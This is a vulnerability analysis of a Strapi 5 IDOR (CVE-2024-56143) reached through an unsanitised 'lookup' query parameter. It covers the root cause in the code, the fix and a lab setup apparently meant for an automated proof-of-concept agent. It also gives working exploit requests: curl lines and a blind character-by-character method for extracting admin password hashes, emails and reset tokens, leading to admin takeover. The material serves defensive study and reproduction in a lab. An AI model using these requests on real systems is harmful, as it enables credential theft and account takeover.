# Vulnerability Analysis: CVE-2024-56143

## Summary

| Field | Value |
|-------|-------|
| **CVE** | CVE-2024-56143 |
| **Title** | Strapi 5 IDOR via `lookup` Parameter Injection |
| **Affected** | Strapi >= 5.0.0, < 5.5.2 (`@strapi/core`) |
| **CWE** | CWE-639 (Authorization Bypass Through User-Controlled Key) |
| **CVSS** | 8.2 (HIGH) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N |
| **Attack Vector** | Remote, unauthenticated HTTP GET requests |
| **Fix Commit** | `0c6e0953ae1e62afae9329de7ae6d6a5e21b95b8` |

---

## Root Cause

The vulnerability is an **Insecure Direct Object Reference (IDOR)** caused by an **unsanitized internal parameter (`lookup`) being exposed to external HTTP input**. The `lookup` parameter was designed as an internal-only mechanism for the document service to add locale and publication status conditions to database queries. However, it was never stripped or validated from externally-supplied query parameters, allowing attackers to inject arbitrary conditions into database WHERE clauses.

### Technical Root Cause Chain

1. **Missing allowlist enforcement in sanitizeQuery**: The `sanitizeQuery()` function (`packages/core/utils/src/sanitize/index.ts`, lines 97-126) uses `cloneDeep(query)` on the ENTIRE query object and only processes `filters`, `sort`, `fields`, and `populate`. Any other top-level parameter (including `lookup`) passes through unchanged.

2. **Missing allowlist enforcement in validateQuery**: The `validateQuery()` function (`packages/core/utils/src/validate/index.ts`, lines 96-122) only validates `filters`, `sort`, `fields`, and `populate`. No other parameters are checked.

3. **Missing allowlist enforcement in validateParams (document service)**: The `validateParams()` function (`packages/core/core/src/services/document-service/repository.ts`, lines 44-54) only validates `filters`, `sort`, `fields`, and `populate` — same gap as the previous two layers.

4. **Dangerous parameter spreading in query transform**: The `transformParamsToQuery()` function (`packages/core/core/src/services/document-service/transform/query.ts`, line 8) directly spreads `params?.lookup` into the database WHERE clause:
   ```typescript
   return assoc('where', { ...params?.lookup, ...query.where }, query);
   ```

5. **Dangerous parameter spreading in repository methods**: Multiple repository methods (`repository.ts`) also spread `queryParams?.lookup` directly into `where` clauses (lines 174, 223, 280, 289, 354, 363).

The combination of these three layers of missing validation (sanitize → validate → document service validate) with the dangerous spread operator creates a direct conduit from HTTP query string to database WHERE clause.

---

## Vulnerable File(s) and Function(s)

### Primary Vulnerability (Injection Point)

**File**: `packages/core/core/src/services/document-service/transform/query.ts`
**Function**: `transformParamsToQuery` (lines 5-9)
**Critical Line**: Line 8
```typescript
return assoc('where', { ...params?.lookup, ...query.where }, query);
```

### Missing Validation (Root Cause)

**File**: `packages/core/core/src/services/document-service/repository.ts`
**Function**: `validateParams` (lines 44-54)
```typescript
const validateParams = async (params: any) => {
    const ctx = { schema: contentType, getModel };
    await validators.validateFilters(ctx, params.filters, filtersValidations);
    await validators.validateSort(ctx, params.sort, sortValidations);
    await validators.validateFields(ctx, params.fields, fieldValidations);
    await validators.validatePopulate(ctx, params.populate, populateValidations);
    // NO CHECK FOR params.lookup — the missing validation
    return params;
};
```

### Sanitization Gap

**File**: `packages/core/utils/src/sanitize/index.ts`
**Function**: `sanitizeQuery` (lines 97-126)
```typescript
const sanitizeQuery = async (query, schema, { auth } = {}) => {
    const { filters, sort, fields, populate } = query;
    const sanitizedQuery = cloneDeep(query);  // Clones EVERYTHING including lookup
    // Only sanitizes filters, sort, fields, populate
    // 'lookup' and all other unknown params pass through
    return sanitizedQuery;
};
```

### Lookup Preservation (enables injection)

**File**: `packages/core/core/src/services/document-service/draft-and-publish.ts`
**Function**: `statusToLookup` (lines 68-85)
```typescript
const statusToLookup: TransformWithContentType = (contentType, params) => {
    // ...
    const lookup = params.lookup || {};   // <-- Preserves any externally-supplied lookup properties
    // ...
    return assoc('lookup', lookup, params);  // <-- Passes them forward
};
```

### Additional Spread Sites in repository.ts

| Line | Function | Code |
|------|----------|------|
| 174 | `clone()` | `where: { ...queryParams?.lookup, documentId, ... }` |
| 223 | `update()` | `where: { ...queryParams?.lookup, ...query?.where, documentId }` |
| 280 | `publish()` | `where: { ...queryParams?.lookup, documentId, publishedAt: null }` |
| 289 | `publish()` | `where: { ...queryParams?.lookup, documentId, publishedAt: { $ne: null } }` |
| 354 | `discardDraft()` | `where: { ...queryParams?.lookup, documentId, publishedAt: { $ne: null } }` |
| 363 | `discardDraft()` | `where: { ...queryParams?.lookup, documentId, publishedAt: null }` |

---

## Triggering Input

### HTTP Request Format

```
GET /api/<content-type>?lookup[<relation>][<private_field>][<operator>]=<value>
```

The `qs` library (configured with `depth: 20`) parses the bracket notation into nested objects:

```
?lookup[createdBy][password][$startsWith]=$2b$10$
```

Becomes:
```json
{
  "lookup": {
    "createdBy": {
      "password": {
        "$startsWith": "$2b$10$"
      }
    }
  }
}
```

This nested object is then spread directly into the database WHERE clause, creating a SQL/ORM condition that filters content entries based on the admin user's private password hash.

### Exact Triggering Input (Minimal PoC)

```bash
# Confirm admin password hash starts with "$2" (bcrypt identifier)
curl -s 'http://localhost:1337/api/<content-type>?lookup[createdBy][password][$startsWith]=$2'
```

**Returns**: Content entries (non-empty `data` array) if match, empty `data` array if no match.

### Useful Operators for Exploitation

| Operator | Purpose | Example |
|----------|---------|---------|
| `$startsWith` | Prefix matching — character-by-character extraction | `lookup[createdBy][password][$startsWith]=$2b$10$abc` |
| `$eq` | Exact match — confirms full value | `lookup[createdBy][password][$eq]=<full_hash>` |
| `$ne` | Not-equal — confirms field is non-null | `lookup[createdBy][password][$ne]=` |
| `$contains` | Substring search | `lookup[createdBy][email][$contains]=@admin` |
| `$endsWith` | Suffix matching | `lookup[createdBy][email][$endsWith]=.com` |

### Targetable Private Fields

The `admin::user` content type (`packages/core/admin/server/src/content-types/User.ts`) exposes these private fields via `createdBy`/`updatedBy` relations:

| Field | Type | Private | Sensitivity |
|-------|------|---------|-------------|
| `password` | password (bcrypt hash) | Yes | **CRITICAL** — Full bcrypt hash extraction |
| `email` | email | Yes | **HIGH** — Admin email enumeration |
| `resetPasswordToken` | string | Yes | **CRITICAL** — Account takeover via password reset |
| `registrationToken` | string | Yes | **HIGH** — Invitation token extraction |
| `isActive` | boolean | Yes | Medium — Account status |
| `blocked` | boolean | Yes | Low — Block status |

---

## Attack Scenario

### Prerequisites
1. A Strapi 5.x instance (>= 5.0.0, < 5.5.2)
2. At least one content type with public API access enabled (find/findOne)
3. At least one content entry in that content type (so queries can return results)
4. An admin user exists (created during Strapi setup — always true)

### Step-by-Step Attack

**Step 1: Discover public content types**
```bash
# Try common Strapi content type endpoints
curl -s http://target:1337/api/articles
curl -s http://target:1337/api/posts
curl -s http://target:1337/api/pages
# Any endpoint returning { "data": [...] } confirms a public content type
```

**Step 2: Confirm vulnerability exists**
```bash
# Test if lookup parameter is processed (should return results if admin password starts with $2)
curl -s 'http://target:1337/api/articles?lookup[createdBy][password][$startsWith]=$2'
# If data array is non-empty: vulnerable
```

**Step 3: Extract admin password hash (blind enumeration)**
```
For each position i in [0, 59]:  (bcrypt hash is 60 characters)
  For each character c in charset:
    Request: GET /api/articles?lookup[createdBy][password][$startsWith]=<known_prefix + c>
    If response has data: append c to known_prefix, break
```

The bcrypt charset is: `a-z A-Z 0-9 . / $` — average 32 attempts per character, ~60 characters = ~1920 HTTP requests total for a full bcrypt hash.

**Step 4: Extract admin email**
```bash
curl -s 'http://target:1337/api/articles?lookup[createdBy][email][$startsWith]=a'
# Similar blind enumeration for the email address
```

**Step 5 (Escalation): Extract password reset token**
```bash
# First, trigger a password reset for the discovered email
curl -X POST http://target:1337/admin/forgot-password -d '{"email":"admin@example.com"}'
# Then extract the token
curl -s 'http://target:1337/api/articles?lookup[createdBy][resetPasswordToken][$startsWith]=a'
# Use token to reset admin password — full account takeover
```

### Attack Flow Diagram

```
Attacker (unauthenticated)
    |
    |  GET /api/articles?lookup[createdBy][password][$startsWith]=<guess>
    v
Koa HTTP Server
    |  qs.parse() → { lookup: { createdBy: { password: { $startsWith: <guess> } } } }
    v
Controller.find()
    |  sanitizeQuery(ctx) → lookup passes through (not sanitized)
    v
CollectionTypeService.find()
    |  getFetchParams() → { status: 'published', lookup: {...} }
    v
DocumentService.findMany()
    |  validateParams() → only validates filters/sort/fields/populate
    |  statusToLookup() → preserves external lookup, adds publishedAt condition
    |  transformParamsToQuery() → assoc('where', { ...params?.lookup, ...query.where }, query)
    v
Database Query
    WHERE createdBy.password LIKE '$2b$10$...' AND publishedAt IS NOT NULL
    |
    v
Response: { data: [...entries...] } if match, { data: [] } if no match
```

---

## Impact

### Direct Impact
- **Confidentiality (HIGH)**: Extraction of admin password hashes, email addresses, password reset tokens, and registration tokens for any admin user
- **Integrity (LOW)**: No direct data modification, but extracted credentials enable further attacks

### Escalation Impact
1. **Admin Account Takeover**: Extract `resetPasswordToken` after triggering password reset → use token to set new admin password → full admin access
2. **Offline Password Cracking**: Extract bcrypt hash → offline brute-force with hashcat/john → if password is weak, full admin credentials
3. **Invitation Token Theft**: Extract `registrationToken` → register as admin user on the instance
4. **Data Exfiltration**: With admin access, all content and configuration becomes accessible

---

## Authentication Requirements

**None.** This vulnerability is exploitable by an **unauthenticated, remote attacker**. The only requirement is that the Strapi instance has at least one content type with public read access enabled (find/findOne permission granted to the Public role). This is a common configuration for any CMS that serves content to a frontend.

No API keys, tokens, sessions, or credentials are needed. The attack uses only HTTP GET requests to the public content API (`/api/<content-type>`).

---

## Fix Assessment

### What the Fix Does

The fix (commit `0c6e0953ae`) adds a single validation check in `validateParams()` in `repository.ts`:

```typescript
if (params.lookup) {
  throw new errors.ValidationError("Invalid params: 'lookup'");
}
```

This runs BEFORE any internal code (statusToLookup, localeToLookup) sets the `lookup` parameter, effectively blocking any externally-supplied `lookup` while allowing internal usage.

### Fix Completeness: **Complete**

The fix is effective and addresses the root cause for the following reasons:

1. **All document service methods call validateParams first**: `findMany`, `findFirst`, `findOne`, `count`, `create`, `clone`, `update`, `publish`, `unpublish`, and `discardDraft` all pipe through `validateParams` as the first step.

2. **Validation order is correct**: `validateParams` runs BEFORE `statusToLookup` and `localeToLookup` in every pipeline, so external `lookup` is rejected before internal code can mix it with legitimate lookup values.

3. **The truthiness check is sufficient**: `if (params.lookup)` catches any non-falsy value. The `qs` library would parse `?lookup[x][y]=z` as `{ lookup: { x: { y: 'z' } } }` which is truthy. Falsy values like empty string would not cause harm since spreading an empty string into a WHERE clause has no effect.

4. **No bypass via case sensitivity**: JavaScript is case-sensitive — `Lookup` vs `lookup` are different keys. The code only reads lowercase `lookup`, and `qs` preserves the original case. An uppercase variant wouldn't match the spread in `transformParamsToQuery`.

5. **No bypass via prototype pollution**: The `qs` library filters `__proto__` by default. And even if it didn't, `params.lookup` checks the own property, not the prototype chain.

6. **No bypass via URL encoding**: All URL encoding variants (`%6C%6F%6F%6B%75%70` for `lookup`) are decoded by the HTTP server before reaching `qs.parse()`, producing the same result.

7. **No bypass via alternative parameters**: Only `lookup` is spread into the WHERE clause in `transformParamsToQuery`. No other parameter has the same dangerous spread pattern.

---

## Potential Bypass Vectors

None identified. The fix is thorough for this specific vulnerability.

---

## Escalation Path

**Password Reset Token Extraction → Full Admin Account Takeover → Remote Code Execution**

1. **Trigger password reset**: `POST /admin/forgot-password` with the admin email (which can also be extracted via this vulnerability)
2. **Extract reset token**: Blind enumeration of `resetPasswordToken` via `lookup[createdBy][resetPasswordToken][$startsWith]=<guess>`
3. **Reset admin password**: `POST /admin/reset-password` with the extracted token
4. **Admin panel access**: Login to the Strapi admin panel with the new password
5. **Remote Code Execution**: Strapi admin can upload plugins, modify server configuration, and in some configurations execute arbitrary code via lifecycle hooks or custom controllers

Alternatively:
1. **Extract bcrypt hash** via blind enumeration
2. **Offline cracking** with hashcat (mode 3200) — if password is weak, cracks in minutes
3. **Admin login** → same escalation as above

---

## Related Attack Surface

### Same Pattern — Missing Allowlist on Query Parameters

The root cause is a systemic allowlist gap: both `sanitizeQuery` and `validateQuery` only process a fixed set of known parameters (`filters`, `sort`, `fields`, `populate`) but pass through all other unknown parameters unchanged. While `lookup` is the only parameter that gets spread into WHERE clauses, this allowlist-by-omission pattern means any future internal parameter added to the document service pipeline that reads from `params` could be similarly exposed.

**Specific instances of `lookup` spreading (all in repository.ts)**:

| Line | Function | Usage |
|------|----------|-------|
| 174 | `clone()` | `...queryParams?.lookup` in findMany WHERE |
| 223 | `update()` | `...queryParams?.lookup` in findOne WHERE |
| 280 | `publish()` | `...queryParams?.lookup` in findMany WHERE (drafts) |
| 289 | `publish()` | `...queryParams?.lookup` in findMany WHERE (published) |
| 354 | `discardDraft()` | `...queryParams?.lookup` in findMany WHERE |
| 363 | `discardDraft()` | `...queryParams?.lookup` in findMany WHERE |

All of these are protected by the fix since `validateParams` runs first in every pipeline. No additional unprotected `lookup` spreading was found outside the document service.

### Entity Service (Legacy API)

The entity service (`packages/core/core/src/services/entity-service/index.ts`) delegates to the document service for most operations (`findMany`, `findOne`, `count`, `create`, `update`, `delete`). Its `findPage` method (line 74-81) does use `query-params.transform` directly without going through the document service, but does NOT spread `lookup` into WHERE, so it is not vulnerable.

### Content Manager Plugin (Admin API)

The content-manager plugin (`packages/core/content-manager/server/src/controllers/collection-types.ts`) uses the document service through `strapi.documents(uid)`, which flows through the same `validateParams`. The fix covers this path as well.

---

## Build System

| Component | Value |
|-----------|-------|
| **Package Manager** | Yarn 4.5.0 (Berry) with workspaces |
| **Build Tool** | Nx (monorepo task runner) |
| **Language** | TypeScript 5.3.2 |
| **Runtime** | Node.js 18-22 |
| **Framework** | Koa.js (HTTP server) |

---

## Build Commands

### Recommended Approach: Standalone Strapi Instance (NOT from monorepo)

Building the full Strapi monorepo is complex and unnecessary. Instead, create a standalone Strapi 5.5.1 project:

```bash
# Create a new Strapi 5.5.1 project with SQLite
npx create-strapi-app@5.5.1 my-strapi --quickstart --no-run

# Or install specific packages
mkdir my-strapi && cd my-strapi
npm init -y
npm install @strapi/strapi@5.5.1 @strapi/plugin-users-permissions@5.5.1 better-sqlite3@11.3.0 react@18.3.1 react-dom@18.3.1 react-router-dom@6.22.3 styled-components@6.1.8
```

### If Building from Monorepo

```bash
corepack enable
yarn install
yarn build  # Uses Nx to build all packages
cd examples/getstarted
yarn develop  # Starts the development server
```

---

## Dependencies

### Runtime Dependencies (for standalone Strapi lab)

| Package | Version | Purpose |
|---------|---------|---------|
| `@strapi/strapi` | 5.5.1 | Core Strapi framework |
| `@strapi/plugin-users-permissions` | 5.5.1 | Public API role management |
| `better-sqlite3` | 11.3.0 | SQLite database driver |
| `react` | 18.3.1 | Admin panel |
| `react-dom` | 18.3.1 | Admin panel |
| `react-router-dom` | 6.22.3 | Admin panel routing |
| `styled-components` | 6.1.8 | Admin panel styling |

### System Dependencies

| Package | Purpose |
|---------|---------|
| `node` >= 18, <= 22 | JavaScript runtime |
| `npm` >= 6 | Package manager |
| `python3`, `make`, `g++` | Build native modules (better-sqlite3) |

---

## Runtime Requirements

### Services
- **None required** — Strapi with SQLite needs no external services

### Configuration
1. **Admin user registration**: Complete first-time setup at `http://localhost:1337/admin` to create admin user
2. **Content type creation**: Create at least one collection type (e.g., "Article" with a "title" string field) via admin panel
3. **Public permissions**: In Settings → Roles → Public, enable `find` and `findOne` for the content type
4. **Content entry**: Create at least one entry in the content type (so blind queries can return results)

### Network
- Default port: **1337**
- Admin panel: `http://localhost:1337/admin`
- Content API: `http://localhost:1337/api/<pluralName>`

### Recommended Lab Docker Setup

```dockerfile
FROM node:20-slim

# Install build tools for better-sqlite3
RUN apt-get update && apt-get install -y python3 make g++ && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Create Strapi project
RUN npx create-strapi-app@5.5.1 . --quickstart --no-run

EXPOSE 1337

# Start in development mode (enables admin panel)
CMD ["npm", "run", "develop"]
```

### Automated Setup Notes for PoC Agent

After the Strapi container starts:
1. **Register admin**: `POST /admin/register-admin` with `{ firstname, lastname, email, password }` — only works on first run
2. **Login to admin**: `POST /admin/login` with `{ email, password }` → returns JWT token
3. **Create content type**: Use admin API `POST /content-type-builder/content-types` with JWT
4. **Set permissions**: Use admin API to update Public role permissions
5. **Create content entry**: Use admin API or content API (with JWT) to create entries
6. **Wait for Strapi restart**: Content type creation triggers server restart; wait ~10s and retry

Alternatively, pre-configure content types by mounting a custom `src/api/` directory with schema files into the container, avoiding the need for admin API calls to create content types.
